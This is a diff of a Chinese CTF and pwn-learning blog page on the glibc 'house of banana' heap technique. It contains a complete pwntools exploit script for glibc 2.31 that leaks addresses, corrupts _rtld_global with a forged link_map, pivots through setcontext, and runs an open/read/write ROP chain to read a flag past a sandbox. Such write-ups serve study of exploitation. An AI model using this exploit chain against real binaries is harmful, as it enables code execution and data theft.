@@ -555,8 +555,7 @@
 <p><img src="/pic/house_of_banana/22.png" alt="img"></p>
 <p>走空一轮的意思就是跳转到 <code>ret</code> 指令上，然后立刻退出这一轮的函数指针调用，<code>i--</code> 然后调用下一个 <code>array[i]</code> 中存放的函数指针，此时的 <code>rdx</code> 已经为堆地址了，所以此时去跳转到 <code>setcontext+61</code> 的位置，布置 <code>SROP</code> ，调用 <code>read</code> 函数再次读入 <code>orw</code> 的 <code>rop</code> 链使其正好落到 <code>read</code> 函数的返回地址上，从而绕过沙箱保护。</p>
 <h3 id="2-31版本"><a href="#2-31版本" class="headerlink" title="2.31版本"></a>2.31版本</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">from pwn import *</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#--------------------setting context---------------------</span><br><span class="line">context.clear(arch='amd64', os='linux', log_level='debug')</span><br><span class="line"></span><br><span class="line">context.terminal = ['tmux', 'splitw', '-h']</span><br><span class="line">sla = lambda data, content: p.sendlineafter(data,content)</span><br><span class="line">sa = lambda data, content: p.sendafter(data,content)</span><br><span class="line">sl = lambda data: p.senxdline(data)</span><br><span class="line">rl = lambda data: p.recvuntil(data)</span><br><span class="line">re = lambda data: p.recv(data)</span><br><span class="line">sa = lambda data, content: p.sendafter(data,content)</span><br><span class="line">inter = lambda: p.interactive()</span><br><span class="line">l64 = lambda:u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))</span><br><span class="line">h64=lambda:u64(p.recv(3).ljust(8,b'\x00'))</span><br><span class="line">s=lambda data: p.send(data)</span><br><span class="line">log_addr=lambda data: log.success("---&gt;"+hex(data))</span><br><span class="line">p = lambda s: print('\033[1;31;40m%s --&gt; 0x%x \033[0m' % (s, eval(s)))</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">#---------------------------------------------------------</span><br><span class="line"># libc = ELF('/home/henry/Documents/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')</span><br><span class="line">filename = "./house_of_banana"</span><br><span class="line">p = process(filename)</span><br><span class="line">#p = remote("node5.anna.nssctf.cn",24071)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc=elf.libc</span><br><span class="line">#初始化完成---------------------------------------------------------\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(index,size):</span><br><span class="line">    p.sendlineafter('Your choice:\n', str(1))</span><br><span class="line">    p.sendlineafter('index:\n', str(index))</span><br><span class="line">    p.sendlineafter("Size:\n", str(size))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.sendlineafter('Your choice:\n', str(2))</span><br><span class="line">    p.sendlineafter('index:\n', str(index))</span><br><span class="line"></span><br><span class="line">def edit(index, content):</span><br><span class="line">    p.sendlineafter('Your choice:\n', str(3))</span><br><span class="line">    p.sendlineafter('index:\n', str(index))</span><br><span class="line">    p.sendafter("context: \n",content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    p.sendlineafter('Your choice:\n', str(4))</span><br><span class="line">    p.sendlineafter('index:\n', str(index))</span><br><span class="line">dbg()</span><br><span class="line">add(0,0x428)</span><br><span class="line">add(1,0x500)</span><br><span class="line">add(2,0x418)</span><br><span class="line">delete(0)</span><br><span class="line">add(3,0x500)</span><br><span class="line">show(0)</span><br><span class="line">libc_addr=l64()</span><br><span class="line"></span><br><span class="line">libc_base=libc_addr-0x1ebfd0</span><br><span class="line">log_addr(libc_base)</span><br><span class="line">pause()</span><br><span class="line">edit(0,'a'*0x10)</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">p.recvuntil('a'*0x10)</span><br><span class="line">heap_base=u64(p.recv(3).ljust(8,b'\x00'))-0x290</span><br><span class="line">log_addr(heap_base)</span><br><span class="line">pause()</span><br><span class="line">rtld_global=libc_base+0x1f2018</span><br><span class="line">ret_addr=libc_base+0x0000000000025679</span><br><span class="line">setcontext=0x580a0+libc_base</span><br><span class="line">pop_rdi=libc_base+0x0000000000026b72</span><br><span class="line">pop_rsi=libc_base+0x0000000000027529</span><br><span class="line">pop_rdx_r12=libc_base+0x000000000011c1e1</span><br><span class="line">write_addr=libc_base+libc.symbols['write']</span><br><span class="line">open_addr=libc_base+libc.symbols['open']</span><br><span class="line"></span><br><span class="line">read_addr=libc.symbols['read']+libc_base</span><br><span class="line">delete(2)</span><br><span class="line">edit(0,p64(libc_base+ 0x1ebfd0)*2+p64(heap_base+0x290)+p64(rtld_global-0x20))</span><br><span class="line"></span><br><span class="line">add(4,0x500)</span><br><span class="line"></span><br><span class="line">link_map=p64(0)</span><br><span class="line">link_map+=p64(0)#l_next</span><br><span class="line">link_map+=p64(0)</span><br><span class="line">link_map+=p64(heap_base+0xb90+0x40)#l_real</span><br><span class="line">link_map+=p64(0)*28</span><br><span class="line">link_map+=p64(heap_base+0xc08+0x98+0x40)#l-&gt;l_info[26]</span><br><span class="line">link_map+=p64(heap_base+0xc08+32+0x98+0x40)#l-&gt;l_info[26]-&gt;d_un.d_ptr</span><br><span class="line">link_map+=p64(heap_base+0xc08+0x10+0x98+0x40)#l-&gt;l_info[28]</span><br><span class="line">link_map+=p64(0x20)#//i=l-&gt;l_info[28]-&gt;d_un.d_val</span><br><span class="line">link_map+=b"flag\x00\x00\x00\x00"</span><br><span class="line">link_map+=p64(heap_base+0xb90+0x40)</span><br><span class="line">link_map+=p64(setcontext+61)</span><br><span class="line">link_map+=p64(ret_addr)</span><br><span class="line">link_map+=p64(0)*12</span><br><span class="line">link_map+=p64(0)#rdi</span><br><span class="line">link_map+=p64(heap_base+0xdc8)#rsi</span><br><span class="line">link_map+=p64(0)*2</span><br><span class="line">link_map+=p64(0x100)#rdx</span><br><span class="line">link_map+=p64(0)*2</span><br><span class="line"></span><br><span class="line">link_map+=p64(heap_base+0xdc8)#rsp</span><br><span class="line">link_map+=p64(read_addr)#rcx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">link_map+=p64(0)*36</span><br><span class="line">link_map+=p64(0x800000000)</span><br><span class="line">edit(2,link_map)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.sendlineafter('Your choice:\n', str(5))</span><br><span class="line"></span><br><span class="line">flag_addr=heap_base+0xd00</span><br><span class="line">orw=p64(pop_rdi)+p64(flag_addr)</span><br><span class="line">orw+=p64(pop_rsi)+p64(0)</span><br><span class="line">orw+=p64(open_addr)</span><br><span class="line">orw+=p64(pop_rdi)+p64(3)</span><br><span class="line">orw+=p64(pop_rsi)+p64(heap_base)</span><br><span class="line">orw+=p64(pop_rdx_r12)+p64(0x50)+p64(0)</span><br><span class="line">orw+=p64(read_addr)</span><br><span class="line">orw+=p64(pop_rdi)+p64(1)</span><br><span class="line">orw+=p64(pop_rsi)+p64(heap_base)</span><br><span class="line">orw+=p64(pop_rdx_r12)+p64(0x50)+p64(0)</span><br><span class="line">orw+=p64(write_addr)</span><br><span class="line">p.sendline(orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://zikh26.github.io/posts/efb4678.html#poc">关于house of banana的学习总结 | ZIKH26’s Blog</a></p>
+<p>参考文献：<br><a target="_blank" rel="noopener" href="https://zikh26.github.io/posts/efb4678.html#poc">关于house of banana的学习总结 | ZIKH26’s Blog</a></p>
 
                 
             </div>
@@ -701,18 +700,17 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2024/09/01/house%20of%20banana/">
+                <a href="/2024/09/19/2024ccb-wp/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="house-of-banana">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="2024长城杯wp">
                         
-                        <span class="card-title">house-of-banana</span>
+                        <span class="card-title">2024长城杯wp</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -722,31 +720,26 @@
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2024-09-01
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2024-09-19
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/pwn%E5%AD%A6%E4%B9%A0/" class="post-category">
-                                    pwn学习
-                                </a>
-                            
-                            <a href="/categories/pwn%E5%AD%A6%E4%B9%A0/%E5%A0%86%E5%88%A9%E7%94%A8/" class="post-category">
-                                    堆利用
+                            <a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    比赛复现
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/house-of/">
-                        <span class="chip bg-color">house_of</span>
+                    <a href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0-2024%E9%95%BF%E5%9F%8E%E6%9D%AF/">
+                        <span class="chip bg-color">比赛复现---2024长城杯</span>
                     </a>
                     
                 </div>
